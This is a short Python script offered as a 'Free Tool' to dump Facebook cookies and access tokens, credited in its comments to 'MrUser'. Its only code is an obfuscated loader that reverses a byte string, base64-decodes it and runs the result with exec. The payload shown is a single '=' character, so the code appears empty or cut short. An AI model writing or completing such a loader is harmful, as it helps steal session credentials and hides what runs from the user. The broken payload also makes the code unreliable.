# Created by MrUser#
#Free Tool#
#Dump FB cookie and Token#
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))